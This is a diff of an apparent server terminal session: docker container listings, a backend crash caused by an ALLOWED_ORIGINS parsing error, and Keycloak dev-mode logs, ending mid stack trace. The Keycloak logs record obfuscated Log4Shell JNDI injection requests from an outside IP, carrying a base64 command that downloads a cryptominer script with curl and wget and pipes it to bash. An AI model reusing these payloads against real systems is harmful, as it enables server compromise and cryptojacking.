@@ -1,13 +1,445 @@
- => ERROR [client-portal build 6/6] RUN npm run build                                                                                                 23.6s
-------
- > [client-portal build 6/6] RUN npm run build:
-1.184
-1.184 > client-portal@0.1.0 build
-1.184 > tsc && vite build
-1.184
-23.35 src/contexts/AuthContext.tsx(2,10): error TS2305: Module '"../services/api"' has no exported member 'apiGet'.
-23.35 src/services/api.ts(1,22): error TS2580: Cannot find name 'process'. Do you need to install type definitions for node? Try `npm i --save-dev @types/node`.
-23.35 src/services/api.ts(92,15): error TS2339: Property 'Authorization' does not exist on type 'HeadersInit'.
-23.35   Property 'Authorization' does not exist on type '[string, string][]'.
-------
-failed to solve: process "/bin/sh -c npm run build" did not complete successfully: exit code: 2
+[root@vmi2390455 sam]# docker ps
+CONTAINER ID   IMAGE                              COMMAND                  CREATED         STATUS                     PORTS                                    NAMES
+76faa6300fe2   local/sam-client-portal:dev        "docker-entrypoint.s…"   3 minutes ago   Up 3 minutes               0.0.0.0:5173->3000/tcp                   compose-client-portal-1
+eb6f62cff98d   local/sam-backend:dev              "uvicorn backend.mai…"   3 minutes ago   Up 3 minutes (unhealthy)   0.0.0.0:8000->8000/tcp                   compose-backend-1
+18b0f1b85f51   local/sam-frontend:dev             "python -m http.serv…"   3 minutes ago   Up 3 minutes               0.0.0.0:8090->8000/tcp                   compose-frontend-1
+a8a6f150194f   quay.io/keycloak/keycloak:22.0.1   "/opt/keycloak/bin/k…"   22 hours ago    Up 22 hours (unhealthy)    8443/tcp, 0.0.0.0:8081->8080/tcp         keycloak
+9631688662f0   postgres:16-alpine                 "docker-entrypoint.s…"   22 hours ago    Up 22 hours (healthy)      5432/tcp                                 compose-postgres-1
+b0cdfdf91899   redis:7-alpine                     "docker-entrypoint.s…"   22 hours ago    Up 22 hours (healthy)      6379/tcp                                 compose-redis-1
+0c795dd2d567   prom/prometheus:v2.55.0            "/bin/prometheus --c…"   32 hours ago    Up 32 hours                0.0.0.0:9090->9090/tcp                   compose-prometheus-1
+da0104c8a5cc   bitnami/zookeeper:3.9              "/opt/bitnami/script…"   32 hours ago    Up 32 hours                2181/tcp, 2888/tcp, 3888/tcp, 8080/tcp   compose-zookeeper-1
+d2a97aef8817   bitnami/kafka:3.7                  "/opt/bitnami/script…"   32 hours ago    Up 32 hours                9092/tcp                                 compose-kafka-1
+2b3daff8b89c   grafana/grafana:11.1.0             "/run.sh"                32 hours ago    Up 32 hours                0.0.0.0:3001->3000/tcp                   compose-grafana-1
+101308e7791c   minio/mc:latest                    "/bin/sh -c ' echo '…"   2 weeks ago     Up 2 weeks                                                          minio-client
+9864a7b37372   minio/minio:latest                 "/usr/bin/docker-ent…"   2 weeks ago     Up 2 weeks (healthy)       0.0.0.0:9000-9001->9000-9001/tcp         minio-server
+f219b96258b5   txe-web_app                        "docker-entrypoint.s…"   6 weeks ago     Up 6 weeks                 0.0.0.0:3002->3002/tcp                   txe-web_app_1
+b76b69afa727   website_app                        "docker-entrypoint.s…"   4 months ago    Up 4 months                0.0.0.0:3000->3000/tcp                   website_app_1
+[root@vmi2390455 sam]# docker logs eb6f62cff98d
+INFO:     Will watch for changes in these directories: ['/app']
+WARNING:  "workers" flag is ignored when reloading is enabled.
+INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
+INFO:     Started reloader process [1] using WatchFiles
+Process SpawnProcess-1:
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/site-packages/pydantic_settings/sources/base.py", line 490, in __call__
+    field_value = self.prepare_field_value(field_name, field, field_value, value_is_complex)
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/site-packages/pydantic_settings/sources/providers/env.py", line 120, in prepare_field_value
+    raise e
+  File "/usr/local/lib/python3.11/site-packages/pydantic_settings/sources/providers/env.py", line 117, in prepare_field_value
+    value = self.decode_complex_value(field_name, field, value)
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/site-packages/pydantic_settings/sources/base.py", line 186, in decode_complex_value
+    return json.loads(value)
+           ^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/multiprocessing/process.py", line 314, in _bootstrap
+    self.run()
+  File "/usr/local/lib/python3.11/multiprocessing/process.py", line 108, in run
+    self._target(*self._args, **self._kwargs)
+  File "/usr/local/lib/python3.11/site-packages/uvicorn/_subprocess.py", line 80, in subprocess_started
+    target(sockets=sockets)
+  File "/usr/local/lib/python3.11/site-packages/uvicorn/server.py", line 67, in run
+    return asyncio.run(self.serve(sockets=sockets))
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 190, in run
+    return runner.run(main)
+           ^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 118, in run
+    return self._loop.run_until_complete(task)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "uvloop/loop.pyx", line 1518, in uvloop.loop.Loop.run_until_complete
+  File "/usr/local/lib/python3.11/site-packages/uvicorn/server.py", line 71, in serve
+    await self._serve(sockets)
+  File "/usr/local/lib/python3.11/site-packages/uvicorn/server.py", line 78, in _serve
+    config.load()
+  File "/usr/local/lib/python3.11/site-packages/uvicorn/config.py", line 436, in load
+    self.loaded_app = import_from_string(self.app)
+                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/site-packages/uvicorn/importer.py", line 19, in import_from_string
+    module = importlib.import_module(module_str)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "<frozen importlib._bootstrap>", line 1204, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1176, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 1147, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 690, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 940, in exec_module
+  File "<frozen importlib._bootstrap>", line 241, in _call_with_frames_removed
+  File "/app/backend/main.py", line 20, in <module>
+    from core.config import settings
+  File "/app/backend/core/config.py", line 194, in <module>
+    settings = Settings()
+               ^^^^^^^^^^
+  File "/usr/local/lib/python3.11/site-packages/pydantic_settings/main.py", line 189, in __init__
+    **__pydantic_self__._settings_build_values(
+      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/site-packages/pydantic_settings/main.py", line 424, in _settings_build_values
+    source_state = source()
+                   ^^^^^^^^
+  File "/usr/local/lib/python3.11/site-packages/pydantic_settings/sources/base.py", line 492, in __call__
+    raise SettingsError(
+pydantic_settings.exceptions.SettingsError: error parsing value for field "ALLOWED_ORIGINS" from source "EnvSettingsSource"
+[root@vmi2390455 sam]# docker logs a8a6f150194f
+Updating the configuration and installing your custom providers, if any. Please wait.
+2025-09-04 15:45:30,894 INFO  [io.quarkus.deployment.QuarkusAugmentor] (main) Quarkus augmentation completed in 46594ms
+2025-09-04 15:45:39,246 INFO  [org.keycloak.quarkus.runtime.hostname.DefaultHostnameProvider] (main) Hostname settings: Base URL: <unset>, Hostname: localhost, Strict HTTPS: false, Path: <request>, Strict BackChannel: false, Admin URL: <unset>, Admin: <request>, Port: -1, Proxied: false
+2025-09-04 15:45:47,034 WARN  [io.quarkus.agroal.runtime.DataSources] (main) Datasource <default> enables XA but transaction recovery is not enabled. Please enable transaction recovery by setting quarkus.transaction-manager.enable-recovery=true, otherwise data may be lost if the application is terminated abruptly
+2025-09-04 15:45:49,385 WARN  [org.infinispan.PERSISTENCE] (keycloak-cache-init) ISPN000554: jboss-marshalling is deprecated and planned for removal
+2025-09-04 15:45:50,650 INFO  [org.infinispan.CONTAINER] (keycloak-cache-init) ISPN000556: Starting user marshaller 'org.infinispan.jboss.marshalling.core.JBossUserMarshaller'
+2025-09-04 15:45:54,834 INFO  [org.keycloak.broker.provider.AbstractIdentityProviderMapper] (main) Registering class org.keycloak.broker.provider.mappersync.ConfigSyncEventListener
+2025-09-04 15:45:59,377 INFO  [org.keycloak.quarkus.runtime.storage.legacy.liquibase.QuarkusJpaUpdaterProvider] (main) Initializing database schema. Using changelog META-INF/jpa-changelog-master.xml
+2025-09-04 15:46:08,049 INFO  [org.keycloak.connections.infinispan.DefaultInfinispanConnectionProviderFactory] (main) Node name: node_166817, Site name: null
+2025-09-04 15:46:08,385 INFO  [org.keycloak.services] (main) KC-SERVICES0050: Initializing master realm
+2025-09-04 15:46:12,752 INFO  [org.keycloak.exportimport.singlefile.SingleFileImportProvider] (main) Full importing from file /opt/keycloak/bin/../data/import/realm.json
+2025-09-04 15:46:18,688 INFO  [org.keycloak.exportimport.util.ImportUtils] (main) Realm 'towerco' imported
+2025-09-04 15:46:18,772 INFO  [org.keycloak.exportimport.dir.DirImportProvider] (main) Importing from directory /opt/keycloak/bin/../data/import
+2025-09-04 15:46:18,772 INFO  [org.keycloak.services] (main) KC-SERVICES0030: Full model import requested. Strategy: IGNORE_EXISTING
+2025-09-04 15:46:18,773 INFO  [org.keycloak.services] (main) KC-SERVICES0032: Import finished successfully
+2025-09-04 15:46:19,080 INFO  [io.quarkus] (main) Keycloak 22.0.1 on JVM (powered by Quarkus 3.2.0.Final) started in 47.603s. Listening on: http://0.0.0.0:8080
+2025-09-04 15:46:19,082 INFO  [io.quarkus] (main) Profile dev activated.
+2025-09-04 15:46:19,083 INFO  [io.quarkus] (main) Installed features: [agroal, cdi, hibernate-orm, jdbc-h2, jdbc-mariadb, jdbc-mssql, jdbc-mysql, jdbc-oracle, jdbc-postgresql, keycloak, logging-gelf, micrometer, narayana-jta, reactive-routes, resteasy, resteasy-jackson, smallrye-context-propagation, smallrye-health, vertx]
+2025-09-04 15:46:19,248 INFO  [org.keycloak.services] (main) KC-SERVICES0009: Added user 'admin' to realm 'master'
+2025-09-04 15:46:19,271 WARN  [org.keycloak.quarkus.runtime.KeycloakMain] (main) Running the server in development mode. DO NOT use this configuration in production.
+2025-09-04 21:53:57,024 WARN  [io.netty.channel.DefaultChannelPipeline] (vert.x-eventloop-thread-0) An exceptionCaught() event was fired, and it reached at the tail of the pipeline. It usually means the last handler in the pipeline did not handle the exception.: java.net.SocketException: Connection reset
+        at java.base/sun.nio.ch.SocketChannelImpl.throwConnectionReset(SocketChannelImpl.java:394)
+        at java.base/sun.nio.ch.SocketChannelImpl.read(SocketChannelImpl.java:426)
+        at io.netty.buffer.PooledByteBuf.setBytes(PooledByteBuf.java:256)
+        at io.netty.buffer.AbstractByteBuf.writeBytes(AbstractByteBuf.java:1132)
+        at io.netty.channel.socket.nio.NioSocketChannel.doReadBytes(NioSocketChannel.java:357)
+        at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:151)
+        at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:788)
+        at io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:724)
+        at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:650)
+        at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:562)
+        at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
+        at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
+        at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
+        at java.base/java.lang.Thread.run(Thread.java:833)
+
+2025-09-04 22:57:25,965 ERROR [org.keycloak.services.error.KeycloakErrorHandler] (executor-thread-1) Uncaught server error: java.lang.IllegalArgumentException: RESTEASY003340: Failure parsing MediaType string: t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//46.8.231.224:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMzEuMjI0L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjMxLjIyNC9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==}')
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.internalParse(MediaTypeHeaderDelegate.java:105)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.parse(MediaTypeHeaderDelegate.java:66)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.fromString(MediaTypeHeaderDelegate.java:32)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.fromString(MediaTypeHeaderDelegate.java:19)
+        at jakarta.ws.rs.core.MediaType.valueOf(MediaType.java:172)
+        at org.jboss.resteasy.specimpl.ResteasyHttpHeaders.getAcceptableMediaTypes(ResteasyHttpHeaders.java:207)
+        at org.jboss.resteasy.core.registry.MatchCache$Key.<init>(MatchCache.java:30)
+        at org.jboss.resteasy.core.registry.RootNode.match(RootNode.java:62)
+        at org.jboss.resteasy.core.registry.RootClassNode.match(RootClassNode.java:42)
+        at org.jboss.resteasy.core.ResourceMethodRegistry.getResourceInvoker(ResourceMethodRegistry.java:439)
+        at org.jboss.resteasy.core.SynchronousDispatcher.getInvoker(SynchronousDispatcher.java:293)
+        at org.jboss.resteasy.core.SynchronousDispatcher.lambda$invoke$4(SynchronousDispatcher.java:233)
+        at org.jboss.resteasy.core.SynchronousDispatcher.lambda$preprocess$0(SynchronousDispatcher.java:154)
+        at org.jboss.resteasy.core.interception.jaxrs.PreMatchContainerRequestContext.filter(PreMatchContainerRequestContext.java:321)
+        at org.jboss.resteasy.core.SynchronousDispatcher.preprocess(SynchronousDispatcher.java:157)
+        at org.jboss.resteasy.core.SynchronousDispatcher.invoke(SynchronousDispatcher.java:229)
+        at io.quarkus.resteasy.runtime.standalone.RequestDispatcher.service(RequestDispatcher.java:82)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.dispatch(VertxRequestHandler.java:147)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.handle(VertxRequestHandler.java:84)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.handle(VertxRequestHandler.java:44)
+        at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1284)
+        at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
+        at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:141)
+        at io.quarkus.vertx.http.runtime.options.HttpServerCommonHandlers$1.handle(HttpServerCommonHandlers.java:58)
+        at io.quarkus.vertx.http.runtime.options.HttpServerCommonHandlers$1.handle(HttpServerCommonHandlers.java:36)
+        at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1284)
+        at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
+        at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:141)
+        at org.keycloak.quarkus.runtime.integration.web.QuarkusRequestFilter.lambda$createBlockingHandler$0(QuarkusRequestFilter.java:82)
+        at io.quarkus.vertx.core.runtime.VertxCoreRecorder$14.runWith(VertxCoreRecorder.java:576)
+        at org.jboss.threads.EnhancedQueueExecutor$Task.run(EnhancedQueueExecutor.java:2513)
+        at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1538)
+        at org.jboss.threads.DelegatingRunnable.run(DelegatingRunnable.java:29)
+        at org.jboss.threads.ThreadLocalResettingRunnable.run(ThreadLocalResettingRunnable.java:29)
+        at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
+        at java.base/java.lang.Thread.run(Thread.java:833)
+
+2025-09-04 22:57:26,120 ERROR [io.quarkus.vertx.http.runtime.QuarkusErrorHandler] (executor-thread-1) HTTP Request to /t%28%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D//46.8.231.224:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMzEuMjI0L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjMxLjIyNC9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==%7D%27%29 failed, error id: 4e2a995e-7c00-4107-b725-273f385b1612-1: java.lang.IllegalArgumentException: RESTEASY003340: Failure parsing MediaType string: t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//46.8.231.224:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMzEuMjI0L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjMxLjIyNC9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==}')
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.internalParse(MediaTypeHeaderDelegate.java:105)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.parse(MediaTypeHeaderDelegate.java:66)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.fromString(MediaTypeHeaderDelegate.java:32)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.fromString(MediaTypeHeaderDelegate.java:19)
+        at jakarta.ws.rs.core.MediaType.valueOf(MediaType.java:172)
+        at org.jboss.resteasy.specimpl.ResteasyHttpHeaders.getAcceptableMediaTypes(ResteasyHttpHeaders.java:207)
+        at org.keycloak.utils.MediaTypeMatcher.isHtmlRequest(MediaTypeMatcher.java:8)
+        at org.keycloak.services.error.KeycloakErrorHandler.getResponse(KeycloakErrorHandler.java:68)
+        at org.keycloak.services.error.KeycloakErrorHandler.toResponse(KeycloakErrorHandler.java:51)
+        at org.jboss.resteasy.core.ExceptionHandler.executeExceptionMapper(ExceptionHandler.java:139)
+        at org.jboss.resteasy.core.ExceptionHandler.handleException(ExceptionHandler.java:346)
+        at org.jboss.resteasy.core.SynchronousDispatcher.writeException(SynchronousDispatcher.java:205)
+        at org.jboss.resteasy.core.SynchronousDispatcher.lambda$invoke$4(SynchronousDispatcher.java:236)
+        at org.jboss.resteasy.core.SynchronousDispatcher.lambda$preprocess$0(SynchronousDispatcher.java:154)
+        at org.jboss.resteasy.core.interception.jaxrs.PreMatchContainerRequestContext.filter(PreMatchContainerRequestContext.java:321)
+        at org.jboss.resteasy.core.SynchronousDispatcher.preprocess(SynchronousDispatcher.java:157)
+        at org.jboss.resteasy.core.SynchronousDispatcher.invoke(SynchronousDispatcher.java:229)
+        at io.quarkus.resteasy.runtime.standalone.RequestDispatcher.service(RequestDispatcher.java:82)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.dispatch(VertxRequestHandler.java:147)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.handle(VertxRequestHandler.java:84)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.handle(VertxRequestHandler.java:44)
+        at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1284)
+        at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
+        at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:141)
+        at io.quarkus.vertx.http.runtime.options.HttpServerCommonHandlers$1.handle(HttpServerCommonHandlers.java:58)
+        at io.quarkus.vertx.http.runtime.options.HttpServerCommonHandlers$1.handle(HttpServerCommonHandlers.java:36)
+        at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1284)
+        at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
+        at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:141)
+        at org.keycloak.quarkus.runtime.integration.web.QuarkusRequestFilter.lambda$createBlockingHandler$0(QuarkusRequestFilter.java:82)
+        at io.quarkus.vertx.core.runtime.VertxCoreRecorder$14.runWith(VertxCoreRecorder.java:576)
+        at org.jboss.threads.EnhancedQueueExecutor$Task.run(EnhancedQueueExecutor.java:2513)
+        at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1538)
+        at org.jboss.threads.DelegatingRunnable.run(DelegatingRunnable.java:29)
+        at org.jboss.threads.ThreadLocalResettingRunnable.run(ThreadLocalResettingRunnable.java:29)
+        at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
+        at java.base/java.lang.Thread.run(Thread.java:833)
+
+2025-09-04 22:57:26,218 ERROR [org.keycloak.services.error.KeycloakErrorHandler] (executor-thread-1) Uncaught server error: java.lang.IllegalArgumentException: RESTEASY003340: Failure parsing MediaType string: ${${upper::-j}${upper::-n}${::-d}${upper::-i}:${upper::-l}${upper::-d}${upper::-a}${upper::-p}://46.8.231.224:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMzEuMjI0L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjMxLjIyNC9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==}
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.internalParse(MediaTypeHeaderDelegate.java:105)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.parse(MediaTypeHeaderDelegate.java:66)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.fromString(MediaTypeHeaderDelegate.java:32)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.fromString(MediaTypeHeaderDelegate.java:19)
+        at jakarta.ws.rs.core.MediaType.valueOf(MediaType.java:172)
+        at org.jboss.resteasy.specimpl.ResteasyHttpHeaders.getAcceptableMediaTypes(ResteasyHttpHeaders.java:207)
+        at org.jboss.resteasy.core.registry.MatchCache$Key.<init>(MatchCache.java:30)
+        at org.jboss.resteasy.core.registry.RootNode.match(RootNode.java:62)
+        at org.jboss.resteasy.core.registry.RootClassNode.match(RootClassNode.java:42)
+        at org.jboss.resteasy.core.ResourceMethodRegistry.getResourceInvoker(ResourceMethodRegistry.java:439)
+        at org.jboss.resteasy.core.SynchronousDispatcher.getInvoker(SynchronousDispatcher.java:293)
+        at org.jboss.resteasy.core.SynchronousDispatcher.lambda$invoke$4(SynchronousDispatcher.java:233)
+        at org.jboss.resteasy.core.SynchronousDispatcher.lambda$preprocess$0(SynchronousDispatcher.java:154)
+        at org.jboss.resteasy.core.interception.jaxrs.PreMatchContainerRequestContext.filter(PreMatchContainerRequestContext.java:321)
+        at org.jboss.resteasy.core.SynchronousDispatcher.preprocess(SynchronousDispatcher.java:157)
+        at org.jboss.resteasy.core.SynchronousDispatcher.invoke(SynchronousDispatcher.java:229)
+        at io.quarkus.resteasy.runtime.standalone.RequestDispatcher.service(RequestDispatcher.java:82)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.dispatch(VertxRequestHandler.java:147)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.handle(VertxRequestHandler.java:84)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.handle(VertxRequestHandler.java:44)
+        at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1284)
+        at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
+        at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:141)
+        at io.quarkus.vertx.http.runtime.options.HttpServerCommonHandlers$1.handle(HttpServerCommonHandlers.java:58)
+        at io.quarkus.vertx.http.runtime.options.HttpServerCommonHandlers$1.handle(HttpServerCommonHandlers.java:36)
+        at io.vertx.ext.web.impl.RouteState.handleContext(RouteState.java:1284)
+        at io.vertx.ext.web.impl.RoutingContextImplBase.iterateNext(RoutingContextImplBase.java:177)
+        at io.vertx.ext.web.impl.RoutingContextImpl.next(RoutingContextImpl.java:141)
+        at org.keycloak.quarkus.runtime.integration.web.QuarkusRequestFilter.lambda$createBlockingHandler$0(QuarkusRequestFilter.java:82)
+        at io.quarkus.vertx.core.runtime.VertxCoreRecorder$14.runWith(VertxCoreRecorder.java:576)
+        at org.jboss.threads.EnhancedQueueExecutor$Task.run(EnhancedQueueExecutor.java:2513)
+        at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1538)
+        at org.jboss.threads.DelegatingRunnable.run(DelegatingRunnable.java:29)
+        at org.jboss.threads.ThreadLocalResettingRunnable.run(ThreadLocalResettingRunnable.java:29)
+        at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
+        at java.base/java.lang.Thread.run(Thread.java:833)
+
+2025-09-04 22:57:26,219 ERROR [io.quarkus.vertx.http.runtime.QuarkusErrorHandler] (executor-thread-1) HTTP Request to /$%7B$%7Bupper::-j%7D$%7Bupper::-n%7D$%7B::-d%7D$%7Bupper::-i%7D:$%7Bupper::-l%7D$%7Bupper::-d%7D$%7Bupper::-a%7D$%7Bupper::-p%7D://46.8.231.224:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMzEuMjI0L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjMxLjIyNC9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==%7D failed, error id: 4e2a995e-7c00-4107-b725-273f385b1612-2: java.lang.IllegalArgumentException: RESTEASY003340: Failure parsing MediaType string: ${${upper::-j}${upper::-n}${::-d}${upper::-i}:${upper::-l}${upper::-d}${upper::-a}${upper::-p}://46.8.231.224:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMzEuMjI0L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjMxLjIyNC9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==}
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.internalParse(MediaTypeHeaderDelegate.java:105)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.parse(MediaTypeHeaderDelegate.java:66)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.fromString(MediaTypeHeaderDelegate.java:32)
+        at org.jboss.resteasy.plugins.delegates.MediaTypeHeaderDelegate.fromString(MediaTypeHeaderDelegate.java:19)
+        at jakarta.ws.rs.core.MediaType.valueOf(MediaType.java:172)
+        at org.jboss.resteasy.specimpl.ResteasyHttpHeaders.getAcceptableMediaTypes(ResteasyHttpHeaders.java:207)
+        at org.keycloak.utils.MediaTypeMatcher.isHtmlRequest(MediaTypeMatcher.java:8)
+        at org.keycloak.services.error.KeycloakErrorHandler.getResponse(KeycloakErrorHandler.java:68)
+        at org.keycloak.services.error.KeycloakErrorHandler.toResponse(KeycloakErrorHandler.java:51)
+        at org.jboss.resteasy.core.ExceptionHandler.executeExceptionMapper(ExceptionHandler.java:139)
+        at org.jboss.resteasy.core.ExceptionHandler.handleException(ExceptionHandler.java:346)
+        at org.jboss.resteasy.core.SynchronousDispatcher.writeException(SynchronousDispatcher.java:205)
+        at org.jboss.resteasy.core.SynchronousDispatcher.lambda$invoke$4(SynchronousDispatcher.java:236)
+        at org.jboss.resteasy.core.SynchronousDispatcher.lambda$preprocess$0(SynchronousDispatcher.java:154)
+        at org.jboss.resteasy.core.interception.jaxrs.PreMatchContainerRequestContext.filter(PreMatchContainerRequestContext.java:321)
+        at org.jboss.resteasy.core.SynchronousDispatcher.preprocess(SynchronousDispatcher.java:157)
+        at org.jboss.resteasy.core.SynchronousDispatcher.invoke(SynchronousDispatcher.java:229)
+        at io.quarkus.resteasy.runtime.standalone.RequestDispatcher.service(RequestDispatcher.java:82)
+        at io.quarkus.resteasy.runtime.standalone.VertxRequestHandler.dispatch(VertxRequestHandler.java:147)
